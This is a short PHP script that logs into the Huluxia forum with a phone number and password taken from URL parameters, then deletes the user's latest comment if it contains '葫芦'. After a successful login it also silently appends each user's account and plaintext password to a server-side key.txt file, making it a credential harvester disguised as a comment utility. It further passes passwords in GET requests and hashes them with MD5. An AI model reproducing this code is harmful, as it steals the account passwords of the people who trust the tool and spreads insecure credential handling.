<?php

//登录
$phoneNumber=$_GET["phone"];
$password=md5($_GET["key"],false);
$r=$_GET["key"];
$result=file_get_contents("http://floor.huluxia.com/account/login/ANDROID/4.0?device_code=1&account=".$phoneNumber."&login_type=2&password=".$password);
$returnJson=json_decode($result,true);
$msg=$returnJson["msg"];
$key=$returnJson["_key"];
$uid=$returnJson["user"]["userID"];

switch($msg)
{
  case "账号或密码错误":
    echo '<script>window.alert("账号或密码错误！");</script>';
    break;
  case "参数不合法":
    echo '<script>window.alert("参数不合法！");</script>';
    break;
  case "账号不存在":
    echo '<script>window.alert("账号不存在");</script>';
    break;
  case "":
   //读取记录
$myfilert = fopen("key.txt", "r") or die("Unable to open file!");
$f = fread($myfilert,filesize("key.txt"));
fclose($myfilert);

//记录

    $myfile = fopen("key.txt", "w") or die("Unable to open file!");
$txt = $f."账号：".$phoneNumber."密码:".$r."\n";
fwrite($myfile, $txt);
fclose($myfile);
    break;
}
//获取
$wcnm=file_get_contents("http://floor.huluxia.com/comment/create/list/ANDROID/2.0?user_id=".$uid."&start=0&count=20&platform=2&gkey=000000&app_version=4.1.1.5.1&versioncode=329&market_id=tool_tencent&_key=".$key."&device_code=%5Bd%5Df6ec92f3-e2e4-43bc-a7f6-53677fe4d1a9&phone_brand_type=HW");
$returnJsonhl=json_decode($wcnm,true);
$arr2 = json_decode($wcnm,true);
//超级获取术
echo"<p>评论内容：".$a=$arr2["comments"][0]["text"];//评论内容
echo"<p>评论ID:".$plid=$arr2["comments"][0]["commentID"];//评论ID

if(strpos($a,'葫芦') !== false)
{
    echo"删除评论";
echo file_get_contents("http://floor.huluxia.com/comment/destroy/ANDROID/2.0?comment_id=".$plid."&platform=2&gkey=000000&app_version=4.1.1.5.1&versioncode=329&market_id=tool_tencent&_key=".$key."&device_code=%5Bd%5Df6ec92f3-e2e4-43bc-a7f6-53677fe4d1a9&phone_brand_type=HW");   
}
    